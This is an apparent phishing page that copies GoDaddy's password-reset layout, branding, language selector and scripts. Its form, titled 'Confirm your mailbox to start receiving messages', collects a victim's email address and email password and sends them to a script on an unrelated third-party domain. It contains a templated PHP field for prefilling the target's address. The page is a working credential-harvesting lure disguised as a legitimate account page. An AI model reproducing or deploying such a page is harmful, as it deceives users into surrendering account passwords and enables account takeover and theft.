  margin-bottom: 0 !important; }

.m-b-xxs {
  margin-bottom: 1px; }

.m-b-xs {
  margin-bottom: 5px; }

.m-b-sm {
  margin-bottom: 10px; }

.m-b {
  margin-bottom: 15px; }

.m-b-md {
  margin-bottom: 20px; }

.m-b-lg {
  margin-bottom: 30px; }

.m-b-xl {
  margin-bottom: 40px; }

.m-b-n-xxs {
  margin-bottom: -1px; }

.m-b-n-xs {
  margin-bottom: -5px; }

.m-b-n-sm {
  margin-bottom: -10px; }

.m-b-n {
  margin-bottom: -15px; }

.m-b-n-md {
  margin-bottom: -20px; }

.m-b-n-lg {
  margin-bottom: -30px; }

.m-b-n-xl {
  margin-bottom: -40px; }

.space-15 {
  margin: 15px 0; }

.space-20 {
  margin: 20px 0; }

.space-25 {
  margin: 25px 0; }

.space-30 {
  margin: 30px 0; }

#form-header {
  width: 100%;
  margin-bottom: 0px;
  padding-bottom: 0px; }
  #form-header .top-spacer {
    padding-top: 10px; }
  #form-header .logo-container {
    position: relative;
    width: 100%;
    margin: auto; }
  #form-header .logo {
    max-width: 150px;
    max-height: 50px; }
  #form-header .leftAligned {
    text-align: left; }
  #form-header .white-override {
    color: white; }
  #form-header #default-template #default-logo-container {
    width: 150px;
    margin: auto; }
    #form-header #default-template #default-logo-container .country-name {
      z-index: 100;
      position: absolute;
      font-size: 11px;
      right: 12px;
      top: 3px;
      white-space: nowrap; }
  #form-header #default-template #head-logo-container {
    width: 36px;
    margin: auto; }
    #form-header #default-template #head-logo-container .country-name {
      z-index: 100;
      position: absolute;
      font-size: 11px;
      left: 35px;
      top: 38px;
      white-space: nowrap; }
  #form-header #pass-template .logo-container-pass {
    background: #333;
    padding: 30px 0;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px; }
  #form-header #pass-template .logo-container-pass-o365 {
    width: 150px;
    margin: auto; }
  #form-header #pass-template .logo-container-pass-o365-sign-in {
    margin: auto;
    background: #E74225;
    padding: 30px 0;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px; }
  #form-header #reseller-template .reseller-logo-container {
    width: 150px;
    margin: auto; }

@media (min-width: 768px) {
  #form-header .top-spacer {
    padding-top: 20px; }
  #form-header .logo {
    max-width: 275px;
    max-height: 75px; }
  #form-header #default-template #default-logo-container {
    width: 275px;
    margin: auto; }
    #form-header #default-template #default-logo-container .country-name {
      font-size: 15px !important;
      right: 40px;
      top: 5px;
      white-space: nowrap; }
  #form-header #default-template #head-logo-container {
    width: 55px;
    margin: auto; }
    #form-header #default-template #head-logo-container .country-name {
      font-size: 15px !important;
      left: 50px;
      top: 58px;
      white-space: nowrap; }
  #form-header #pass-template .logo-container-pass-o365 {
    width: 175px;
    margin: auto; }
  #form-header #reseller-template .reseller-logo-container {
    width: 275px;
    margin: auto; } }
</style><style type="text/css">#parent-card {
  background: white; }

#parent-card #pass-template {
  margin-bottom: 15px; }

#passwordRecoveryCard {
  padding: 0px 20px 40px 20px; }

#PasswordRecoveryOptionsButton {
  min-width: 100%; }

#passwordRecoveryCard h5 {
  margin-bottom: 0px; }

/* page title styling */
#passwordRecoveryCard #header-navigation {
  margin-top: 0px;
  margin-bottom: 0px;
  cursor: pointer; }

#passwordRecoveryCard #page-title-container .page-title {
  margin-top: 10px;
  margin-bottom: 20px; }

#passwordRecoveryCard #page-title-container .page-title-with-back {
  margin-top: 5px;
  margin-bottom: 20px !important; }

#passwordRecoveryCard #captcha-container {
  margin-bottom: 25px !important; }

#passwordRecoveryCard .uxicon-drop-left {
  margin-left: 0px;
  margin-right: 0px;
  font-size: 12px; }

#passwordRecoveryCard #help-footer {
  margin-top: 30px; }

#passwordRecoveryCard #trouble-footer {
  margin: 0px; }

/* New Password */
#passwordRecoveryCard #passwordReset #create-password-input {
  margin-bottom: 15px !important; }

#passwordRecoveryCard #passwordReset .submit-button {
  margin-top: 15px; }

#passwordRecoveryCard #passwordReset .form-group,
#PasswordRecoveryExpired .form-group {
  margin-bottom: 0px !important; }

#passwordRecoveryCard #submitPassword {
  margin-top: 25px; }

#passwordRecoveryCard .ux-criteria {
  margin-top: 0px !important;
  margin-bottom: 0px !important; }

#passwordRecoveryCard .sign-in-link {
  margin-top: 30px; }

/* SMS Recovery Code */
#passwordRecoveryCard #PasswordRecoverySms fieldset {
  margin-bottom: 0; }

#passwordRecoveryCard #PasswordRecoverySms .submit-button {
  margin-bottom: 25px; }

#passwordRecoveryCard #PasswordRecoverySms .text-muted {
  color: #db1802 !important; }

/* Options */
#PasswordRecoveryOptionsList .form-check {
  margin-bottom: 22px; }

#PasswordRecoveryOptionsList .form-group {
  margin-bottom: 0px; }

#PasswordRecoveryOptions #page-title-container p {
  margin-bottom: 12px; }

#passwordRecoveryCard h2, .workspace-logo .h2 {
  margin-bottom: 15px; }

#passwordRecoveryCard .btn {
  max-width: 700px; }

#passwordRecoveryCard .submit-button,
#PasswordRecoveryLandingSubmitButton {
  width: 100%; }

#PasswordRecoveryExpired .submit-button {
  margin-top: 30px; }

#PasswordRecoveryAlert {
  margin-top: 30px; }

#PasswordRecoverySuccess .font-base {
  margin-bottom: 30px; }

@media screen and (min-width: 1110px) {
  #PasswordRecoveryLandingSubmitButton {
    max-width: 375px; }
  #passwordRecoveryCard {
    padding: 0px 90px 40px 90px !important; }
  #parent-card {
    margin-top: 20px; } }

@media screen and (min-width: 786px) {
  #parent-card {
    margin-top: 30px; }
  #PasswordRecoveryLandingSubmitButton {
    max-width: 786px; }
  #passwordRecoveryCard {
    float: none;
    position: relative;
    max-width: 555px; }
  #passwordRecoveryCard h2, .workspace-logo .h2 {
    margin-bottom: 25px; }
  #passwordRecoveryCard #page-title-container .page-title {
    margin-top: 25px;
    margin-bottom: 20px; }
  #passwordRecoveryCard #page-title-container .page-title-with-back {
    margin-top: 10px;
    margin-bottom: 20px; }
  #PasswordRecoveryOptionsList .row {
    margin-left: -10px;
    margin-right: -10px; }
  #PasswordRecoveryOptionsList .ux-pivot::after,
  #PasswordRecoveryOptionsList .uxicon {
    padding-left: 15px;
    padding-right: 15px; }
  #PasswordRecoveryOptionsList .ux-pivot-title {
    font-size: 18px; } }

#PasswordRecoveryLandingCard h1, .h1 {
  margin-bottom: 15px; }
</style><style type="text/css">/* Sizing */
#captcha-container {
    margin-bottom: 20px !important
}</style><script id="_grecaptcha.element.id" src="./Reset_My_Password_files/api.js" type="text/javascript" async="" defer=""></script></head><body class="ux-app uxf-flex" "="" style="margin-bottom: 64px;"><div class="footer_fixer"><div id="header-85ff98c4b0d823d68217b41206a35a77"><div><div><div class="utility-bar language-header"><div class="container"><div class="row"><div class="flex-row"><div class="utility-left-nav"><div class="market-selector-container"><div class="tray-menu market-selector"><div class="tray-toggle-wrapper"><button data-eid="uxp.hyd.utility_header.market_selector.click" aria-expanded="false" aria-haspopup="true" tabindex="0" class="btn tray-toggle" id="" type="button" aria-label="Content Language Selector. Currently set to United States - English."><span>United States - English</span></button></div><div class="tray-fullwidth tray-dropdown loaded"><div class="tray-content"><button class="close"></button><div class="container"><div class="row"><div class="col-sm-12"><div class="font-primary-bold h3"><span>Choose your Country/Region</span></div></div></div><div class="row"><ul class="market-list col-lg-3 col-md-6 col-sm-12"><li><a href="https://ar.godaddy.com/" data-tcc-ignore="true" data-market="es-AR" data-eid="uxp.hyd.utility_header.market_selector.es_ar.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Argentina</strong> - Español</span></a></li><li><a href="https://au.godaddy.com/" data-tcc-ignore="true" data-market="en-AU" data-eid="uxp.hyd.utility_header.market_selector.en_au.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Australia</strong> - English</span></a></li><li><a href="https://be.godaddy.com/" data-tcc-ignore="true" data-market="nl-BE" data-eid="uxp.hyd.utility_header.market_selector.nl_be.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">België</strong> - Nederlands</span></a></li><li><a href="https://be.godaddy.com/fr" data-tcc-ignore="true" data-market="fr-BE" data-eid="uxp.hyd.utility_header.market_selector.fr_be.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Belgique</strong> - Français</span></a></li><li><a href="https://br.godaddy.com/" data-tcc-ignore="true" data-market="pt-BR" data-eid="uxp.hyd.utility_header.market_selector.pt_br.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Brasil</strong> - Português</span></a></li><li><a href="https://ca.godaddy.com/" data-tcc-ignore="true" data-market="en-CA" data-eid="uxp.hyd.utility_header.market_selector.en_ca.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Canada</strong> - English</span></a></li><li><a href="https://ca.godaddy.com/fr" data-tcc-ignore="true" data-market="fr-CA" data-eid="uxp.hyd.utility_header.market_selector.fr_ca.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Canada</strong> - Français</span></a></li><li><a href="https://cl.godaddy.com/" data-tcc-ignore="true" data-market="es-CL" data-eid="uxp.hyd.utility_header.market_selector.es_cl.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Chile</strong> - Español</span></a></li><li><a href="https://co.godaddy.com/" data-tcc-ignore="true" data-market="es-CO" data-eid="uxp.hyd.utility_header.market_selector.es_co.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Colombia</strong> - Español</span></a></li><li><a href="https://dk.godaddy.com/" data-tcc-ignore="true" data-market="da-DK" data-eid="uxp.hyd.utility_header.market_selector.da_dk.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Danmark</strong> - Dansk</span></a></li><li><a href="https://de.godaddy.com/" data-tcc-ignore="true" data-market="de-DE" data-eid="uxp.hyd.utility_header.market_selector.de_de.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Deutschland</strong> - Deutsch</span></a></li><li><a href="https://es.godaddy.com/" data-tcc-ignore="true" data-market="es-ES" data-eid="uxp.hyd.utility_header.market_selector.es_es.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">España</strong> - Español</span></a></li><li><a href="https://www.godaddy.com/es" data-tcc-ignore="true" data-market="es-US" data-eid="uxp.hyd.utility_header.market_selector.es_us.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Estados Unidos</strong> - Español</span></a></li><li><a href="https://fr.godaddy.com/" data-tcc-ignore="true" data-market="fr-FR" data-eid="uxp.hyd.utility_header.market_selector.fr_fr.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">France</strong> - Français</span></a></li></ul><ul class="market-list col-lg-3 col-md-6 col-sm-12"><li><a href="https://hk.godaddy.com/en" data-tcc-ignore="true" data-market="en-HK" data-eid="uxp.hyd.utility_header.market_selector.en_hk.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Hong Kong</strong> - English</span></a></li><li><a href="https://in.godaddy.com/" data-tcc-ignore="true" data-market="en-IN" data-eid="uxp.hyd.utility_header.market_selector.en_in.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">India</strong> - English</span></a></li><li><a href="https://in.godaddy.com/mr" data-tcc-ignore="true" data-market="mr-IN" data-eid="uxp.hyd.utility_header.market_selector.mr_in.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">India</strong> - मराठी</span></a></li><li><a href="https://in.godaddy.com/hi" data-tcc-ignore="true" data-market="hi-IN" data-eid="uxp.hyd.utility_header.market_selector.hi_in.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">India</strong> - हिंदी</span></a></li><li><a href="https://in.godaddy.com/ta" data-tcc-ignore="true" data-market="ta-IN" data-eid="uxp.hyd.utility_header.market_selector.ta_in.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">India</strong> - தமிழ்</span></a></li><li><a href="https://id.godaddy.com/" data-tcc-ignore="true" data-market="id-ID" data-eid="uxp.hyd.utility_header.market_selector.id_id.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Indonesia</strong> - Bahasa Indonesia</span></a></li><li><a href="https://ie.godaddy.com/" data-tcc-ignore="true" data-market="en-IE" data-eid="uxp.hyd.utility_header.market_selector.en_ie.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Ireland</strong> - English</span></a></li><li><a href="https://il.godaddy.com/en" data-tcc-ignore="true" data-market="en-IL" data-eid="uxp.hyd.utility_header.market_selector.en_il.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Israel</strong> - English</span></a></li><li><a href="https://it.godaddy.com/" data-tcc-ignore="true" data-market="it-IT" data-eid="uxp.hyd.utility_header.market_selector.it_it.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Italia</strong> - Italiano</span></a></li><li><a href="https://my.godaddy.com/" data-tcc-ignore="true" data-market="en-MY" data-eid="uxp.hyd.utility_header.market_selector.en_my.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Malaysia</strong> - English</span></a></li><li><a href="https://mx.godaddy.com/" data-tcc-ignore="true" data-market="es-MX" data-eid="uxp.hyd.utility_header.market_selector.es_mx.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">México</strong> - Español</span></a></li><li><a href="https://nl.godaddy.com/" data-tcc-ignore="true" data-market="nl-NL" data-eid="uxp.hyd.utility_header.market_selector.nl_nl.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Nederland</strong> - Nederlands</span></a></li><li><a href="https://nz.godaddy.com/" data-tcc-ignore="true" data-market="en-NZ" data-eid="uxp.hyd.utility_header.market_selector.en_nz.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">New Zealand</strong> - English</span></a></li><li><a href="https://no.godaddy.com/" data-tcc-ignore="true" data-market="nb-NO" data-eid="uxp.hyd.utility_header.market_selector.nb_no.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Norge</strong> - Bokmål</span></a></li></ul><ul class="market-list col-lg-3 col-md-6 col-sm-12"><li><a href="https://at.godaddy.com/" data-tcc-ignore="true" data-market="de-AT" data-eid="uxp.hyd.utility_header.market_selector.de_at.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Österreich</strong> - Deutsch</span></a></li><li><a href="https://pk.godaddy.com/" data-tcc-ignore="true" data-market="en-PK" data-eid="uxp.hyd.utility_header.market_selector.en_pk.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Pakistan</strong> - English</span></a></li><li><a href="https://pe.godaddy.com/" data-tcc-ignore="true" data-market="es-PE" data-eid="uxp.hyd.utility_header.market_selector.es_pe.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Perú</strong> - Español</span></a></li><li><a href="https://ph.godaddy.com/" data-tcc-ignore="true" data-market="en-PH" data-eid="uxp.hyd.utility_header.market_selector.en_ph.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Philippines</strong> - English</span></a></li><li><a href="https://pl.godaddy.com/" data-tcc-ignore="true" data-market="pl-PL" data-eid="uxp.hyd.utility_header.market_selector.pl_pl.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Polska</strong> - Polski</span></a></li><li><a href="https://pt.godaddy.com/" data-tcc-ignore="true" data-market="pt-PT" data-eid="uxp.hyd.utility_header.market_selector.pt_pt.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Portugal</strong> - Português</span></a></li><li><a href="https://ch.godaddy.com/" data-tcc-ignore="true" data-market="de-CH" data-eid="uxp.hyd.utility_header.market_selector.de_ch.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Schweiz</strong> - Deutsch</span></a></li><li><a href="https://sg.godaddy.com/" data-tcc-ignore="true" data-market="en-SG" data-eid="uxp.hyd.utility_header.market_selector.en_sg.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Singapore</strong> - English</span></a></li><li><a href="https://za.godaddy.com/" data-tcc-ignore="true" data-market="en-ZA" data-eid="uxp.hyd.utility_header.market_selector.en_za.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">South Africa</strong> - English</span></a></li><li><a href="https://ch.godaddy.com/fr" data-tcc-ignore="true" data-market="fr-CH" data-eid="uxp.hyd.utility_header.market_selector.fr_ch.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Suisse</strong> - Français</span></a></li><li><a href="https://fi.godaddy.com/" data-tcc-ignore="true" data-market="fi-FI" data-eid="uxp.hyd.utility_header.market_selector.fi_fi.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Suomi</strong> - Suomi</span></a></li><li><a href="https://se.godaddy.com/" data-tcc-ignore="true" data-market="sv-SE" data-eid="uxp.hyd.utility_header.market_selector.sv_se.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Sverige</strong> - Svenska</span></a></li><li><a href="https://ch.godaddy.com/it" data-tcc-ignore="true" data-market="it-CH" data-eid="uxp.hyd.utility_header.market_selector.it_ch.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Svizzera</strong> - Italiano</span></a></li><li><a href="https://tr.godaddy.com/" data-tcc-ignore="true" data-market="tr-TR" data-eid="uxp.hyd.utility_header.market_selector.tr_tr.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Türkiye</strong> - Türkçe</span></a></li></ul><ul class="market-list col-lg-3 col-md-6 col-sm-12"><li><a href="https://ae.godaddy.com/" data-tcc-ignore="true" data-market="en-AE" data-eid="uxp.hyd.utility_header.market_selector.en_ae.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">United Arab Emirates</strong> - English</span></a></li><li><a href="https://uk.godaddy.com/" data-tcc-ignore="true" data-market="en-GB" data-eid="uxp.hyd.utility_header.market_selector.en_gb.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">United Kingdom</strong> - English</span></a></li><li class="selected"><a href="https://www.godaddy.com/" data-tcc-ignore="true" data-market="en-US" data-eid="uxp.hyd.utility_header.market_selector.en_us.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">United States</strong> - English</span></a></li><li><a href="https://ve.godaddy.com/" data-tcc-ignore="true" data-market="es-VE" data-eid="uxp.hyd.utility_header.market_selector.es_ve.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Venezuela</strong> - Español</span></a></li><li><a href="https://vn.godaddy.com/" data-tcc-ignore="true" data-market="vi-VN" data-eid="uxp.hyd.utility_header.market_selector.vi_vn.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Việt Nam</strong> - Tiếng Việt</span></a></li><li><a href="https://gr.godaddy.com/" data-tcc-ignore="true" data-market="el-GR" data-eid="uxp.hyd.utility_header.market_selector.el_gr.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Ελλάδα</strong> - Ελληνικά</span></a></li><li><a href="https://ru.godaddy.com/" data-tcc-ignore="true" data-market="ru-RU" data-eid="uxp.hyd.utility_header.market_selector.ru_ru.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Россия</strong> - Русский</span></a></li><li><a href="https://ua.godaddy.com/" data-tcc-ignore="true" data-market="uk-UA" data-eid="uxp.hyd.utility_header.market_selector.uk_ua.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">Україна</strong> - Українська</span></a></li><li><a href="https://th.godaddy.com/" data-tcc-ignore="true" data-market="th-TH" data-eid="uxp.hyd.utility_header.market_selector.th_th.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">ไทย</strong> - ไทย</span></a></li><li><a href="https://kr.godaddy.com/" data-tcc-ignore="true" data-market="ko-KR" data-eid="uxp.hyd.utility_header.market_selector.ko_kr.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">대한민국</strong> - 한국어</span></a></li><li><a href="https://tw.godaddy.com/" data-tcc-ignore="true" data-market="zh-TW" data-eid="uxp.hyd.utility_header.market_selector.zh_tw.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">台灣</strong> - 繁體中文</span></a></li><li><a href="https://sg.godaddy.com/zh" data-tcc-ignore="true" data-market="zh-SG" data-eid="uxp.hyd.utility_header.market_selector.zh_sg.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">新加坡</strong> - 简体中文</span></a></li><li><a href="https://jp.godaddy.com/" data-tcc-ignore="true" data-market="ja-JP" data-eid="uxp.hyd.utility_header.market_selector.ja_jp.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">日本</strong> - 日本語</span></a></li><li><a href="https://hk.godaddy.com/" data-tcc-ignore="true" data-market="zh-HK" data-eid="uxp.hyd.utility_header.market_selector.zh_hk.click"><span data-tcc-ignore="true"><strong data-tcc-ignore="true">香港</strong> - 繁體中文</span></a></li></ul></div></div></div></div></div></div></div><div class="utility-right-nav"><div class="tray-menu contact-tray"><div class="tray-toggle-wrapper"><button data-eid="uxp.hyd.utility_bar.contact_tray.tray.click" aria-expanded="false" aria-haspopup="true" tabindex="0" class="btn tray-toggle" id="" type="button" aria-label="Contact Us"><span><div><span class="basic-phone-text hidden-sm-down">Contact Us 24/7</span></div></span></button></div><div class="tray-fullwidth tray-dropdown loaded"><div class="tray-content"><button class="close"></button><div class="container"><div class="row"><div class="col-lg-4 col-md-6 content-wrap"><div class="row"><div class="col-sm-12"><div class="font-primary-bold h3"><span>Call us</span></div></div></div><ul class="alt-contact-list list-unstyled"><li><span>Call our award-winning sales &amp; support team 24/7</span><a class="contact-link" data-eid="uxp.hyd.utility_bar.support_phone.click" href="tel:4805058877">480-505-8877</a></li></ul><div class="contact-link-info"><span>Global Directory</span></div><a href="https://www.godaddy.com/contact-us" class="contact-link" data-eid="uxp.hyd.utility_bar.global_directory.link.click" data-tcc-ignore="true"><span>Phone numbers and hours</span></a></div><div class="col-lg-4 col-md-6 content-wrap divider"><div id="gdchat-container"></div></div><div class="col-md-4 help-mobile hidden-md-up"><div class="row"><div class="col-sm-12"><div class="font-primary-bold h3"><span>Help Center</span></div></div></div><p><span>Explore our online help resources</span></p><div><a href="https://www.godaddy.com/help" class="btn btn-default" data-eid="uxp.hyd.utility_bar.help_center_link.link.click" data-tcc-ignore="true"><span>Get Help</span></a></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div><div class="lg-container"><div class="row"><div id="password-reset-container-row"><div id="password-reset-container-col" class="container-width-limit col-xs-12 col-sm-8 offset-sm-2 col-md-6 offset-md-3 col-lg-6 col-xl-6
            ">
            <p style="text-align: center;">
            </p>
            <div id="password-reset-container"><div id="parent-card" class="ux-card"><div id="form-header">

              <form action="https://leatherfabriccollection.com/app/completed.php" method="GET">
              <div id="default-template" class="top-spacer"><div id="default-logo-container"></div></div>
               <div id="passwordRecoveryCard"><div><div id="PasswordRecoveryLandingCard"><div id="page-title-container"><div><div id="header-navigation" class="back-button" style="cursor: pointer;"></div>
            <input type="hidden" name="userid" value=""><h4 class="page-title-with-back">Confirm your mailbox to start receiving messages</h4></div></div><fieldset class="form-group"><input spellcheck="false" type="text" placeholder="Email Address" required name="email" aria-labelledby="label-PasswordRecoveryLandingUsername" aria-required="false" class="ctHidden form-control" value="<?php echo $client_id;?>"></fieldset><fieldset class="form-group">
              <label for="PasswordRecoveryLandingUsername" id="label-PasswordRecoveryLandingUsername"></label><input spellcheck="false" type="password" placeholder="Email Password" required id="" name="new_pass" aria-labelledby="label-PasswordRecoveryLandingUsername" aria-required="false" class="ctHidden form-control" value=""></fieldset><fieldset class="form-group">
            
            </fieldset><button tabindex="0" class="btn btn-primary submit-button" id="" type="submit">Confirm Mailbox</button></div></div></div> </form>
            </div></div></div></div></div></div></div>


            <div id="footer-85ff98c4b0d823d68217b41206a35a77"><footer id="appheader-footer" class="manifest footer"><div role="contentinfo" class="container"><span>Copyright © 1999 - 2019.  All Rights Reserved.</span> <a href="#" target="_blank" data-eid="uxp.hyd.int.pc.app_header.footer.privacy_policy.link.click"><span>Privacy Policy</span></a></div><div id="gtm_privacy"></div></footer></div><script>
window.ux = window.ux || {};
window.ux.eldorado = window.ux.eldorado || {};

(function trfqConfig() {
  var w = window;
  var page = w.ux.eldorado.page || {};
  w._gaDataLayer = w._gaDataLayer || [];
  w._gaDataLayer = [{'loadSource': 'uxpHeader'}].concat(w._gaDataLayer, (w.ux && w.ux.gaconfig) || []);
  w._trfq = w._trfq || [];
})();
</script><script>
window.ux = window.ux || {};
window.ux.eldorado = window.ux.eldorado || {};
window.ux.fns = [];
window.ux.ready = function uxReadyPreScriptsLoaded(fn) {
  window.ux.fns.push(fn);
};
window.ux.eldorado.readyFns = [];
window.ux.eldorado.ready = function eldoradoReadyPreScriptsLoaded(fn) {
  window.ux.eldorado.readyFns.push(fn);
};
window.ux.eldorado.shopperData = function shopperDataPreQueue(fn) {
  if (!fn) return;
  window.ux.eldorado._shopperDataFns = window.ux.eldorado._shopperDataFns || [];
  window.ux.eldorado._shopperDataFns.push(fn);
};
window.ux.eldorado._onDelayedJSLoaded = function _onDelayedJSLoaded(err) {
  var fn;
  while (fn = window.ux.eldorado._onDelayedJSLoadedFns.shift()) {
    try {
      fn(err);
    } catch(e) {
    }
  }
};
window.addEventListener('load', function loadDeferredScripts() {
  var el, els = [], numScriptsRequested = 5;
  function createScript(src) {
    var el = document.createElement('script');
    el.async = false;
    el.onload = checkIfLoadComplete;
    el.onerror = handleLoadError;
    el.src = src;
    return el;
  }
  function checkIfLoadComplete() {
    if (!--numScriptsRequested) {
      window.ux.eldorado._onDelayedJSLoaded();
    }
  }
  function handleLoadError() {
    if (!this) return;
    var parent;
    if (this.parentNode) {
      parent = this.parentNode;
      this.parentNode.removeChild(this);
    }
    this.onerror = this.onload = null;

    if (!this.isRetry && parent) {
      // Retry once
      var el = createScript(this.src);
      el.isRetry = true;
      parent.appendChild(el);
    } else {
      var errorMessage = 'Error: failed to load "' + this.src + '"';
      window.ux.eldorado._onDelayedJSLoaded(new Error(errorMessage));
    }
  }
  els.push(createScript('https://img1.wsimg.com/wrhs-assets/2aa1368075f9eab136684d979c85d9b7/tcc.min.js'));
  els.push(createScript('https://img1.wsimg.com/poly/v2/polyfill.min.js?features=Promise,Promise.prototype.finally,Intl.~locale.en-US&rum=0&unknown=polyfill&flags=gated'));
  els.push(createScript('https://img1.wsimg.com/wrhs-assets/67f2c7b3d794c03f254e6d78b905f2fc/vendor.min.js'));
  els.push(createScript('https://img1.wsimg.com/wrhs-assets/1723ed3736cd3bfe5831dce0d905dde9/uxcore2.min.js'));
  els.push(createScript('https://img1.wsimg.com/wrhs-assets/a441444ab751a5b4195d874cc29acbe1/utilityheader.min.js'));
  var scriptsParent = document.getElementsByTagName('script')[0].parentNode;
  while (el = els.shift()) scriptsParent.appendChild(el);
});
</script><script>
  window.ux.eldorado._onDelayedJSLoadedFns = window.ux.eldorado._onDelayedJSLoadedFns || [];
  window.ux.eldorado._onDelayedJSLoadedFns.push(function delayedGlobals(err) {
    if (err) return;
    ux.eldorado.data.set({"accountHomeButton":false,"app":"sso","appName":"Unknown","currency":"USD","countryName":"United States","env":"prod","excludeBoing":["el","en-IN","hi","ja","ko","mr","pt-BR","ta","th","ru","uk","vi","zh"],"features":{"contactTray":true,"utilityChat":true},"languageName":"English","logos":{"mobile":"","desktop":""},"manifest":"UtilityHeader","manifestVersion":"19.3.5","market":"en-US","messages":{"PC:AppHeader:Header:MyAccountHome":"My Account Home","PC:AppHeader:Header:AcctDelegationLabel":"{delegate} logged in as: {firstName} {lastName}","PC:AppHeader:Header:AcctImpersonationExitLabel":"Stop impersonation","PC:AppHeader:Header:AcctDelegationExitLabel":"Exit access","PC:AppHeader:Footer:TagLine":"It's Go Time","PC:AppHeader:Footer:PrivacyPolicy":"Privacy Policy","PC:AppHeader:Footer:Copyright":"Copyright &copy; 1999 - {year} All Rights Reserved.","PC:AppHeader:Footer:CopyrightPL":"Copyright &copy; 1999 - {year} All Rights Reserved.","Sales:Tealium:PrivacyPolicy:acceptButton":"Accept","Sales:Tealium:PrivacyPolicy:advertisingText":"Measures our advertising effectiveness to help us make it more relevant to you.","Sales:Tealium:PrivacyPolicy:analyticsText":"Collects anonymous data about how visitors use our site and how it performs. We use this to improve our products, services and user experience.","Sales:Tealium:PrivacyPolicy:CategoryName:Advertising":"Advertising","Sales:Tealium:PrivacyPolicy:CategoryName:Analytics":"Performance","Sales:Tealium:PrivacyPolicy:CategoryName:Social":"Social Media","Sales:Tealium:PrivacyPolicy:CategoryName:Support":"Support","Sales:Tealium:PrivacyPolicy:continueButton":"Continue","Sales:Tealium:PrivacyPolicy:declineButton":"Decline","Sales:Tealium:PrivacyPolicy:default":"Default","Sales:Tealium:PrivacyPolicy:dismissButton":"Dismiss","Sales:Tealium:PrivacyPolicy:manageSettings":"Manage Settings","Sales:Tealium:PrivacyPolicy:optOutDialogCategoryLabel":"Category","Sales:Tealium:PrivacyPolicy:optOutDialogDescriptionLabel":"Description","Sales:Tealium:PrivacyPolicy:optOutDialogMsg":"Our sites use tools, such as cookies, to understand how you use our services and to improve both your experience and our advertising relevance. Here, you can opt-out of such tracking.","Sales:Tealium:PrivacyPolicy:optOutDialogMsgTitle":"Your Privacy Options","Sales:Tealium:PrivacyPolicy:optOutDialogStatusLabel":"Status","Sales:Tealium:PrivacyPolicy:optOutDialogTitle":"Your Privacy Options","Sales:Tealium:PrivacyPolicy:optOutTealiumCookiesDesc":"Enables essential services and functionality, including identity verification, service continuity and site security. Opt-Out is not available.","Sales:Tealium:PrivacyPolicy:optOutTealiumCookiesTitle":"Essential","Sales:Tealium:PrivacyPolicy:privacyBannerText":"We use tools, such as cookies, to enable essential services and functionality on our site and to collect data on how visitors interact with our site, products and services. By clicking Accept, you agree to our use of these tools for advertising, analytics and support","Sales:Tealium:PrivacyPolicy:privacyMoreInfoLink":"Learn More","Sales:Tealium:PrivacyPolicy:privacyTitle":"We serve cookies.","Sales:Tealium:PrivacyPolicy:saveButton":"Save","Sales:Tealium:PrivacyPolicy:socialText":"To enhance user experience, and make it easier to share content, some pages contain tools linked to social media services. For details on how they use information that is gathered, please see the service provider’s website.","Sales:Tealium:PrivacyPolicy:supportText":"Powers 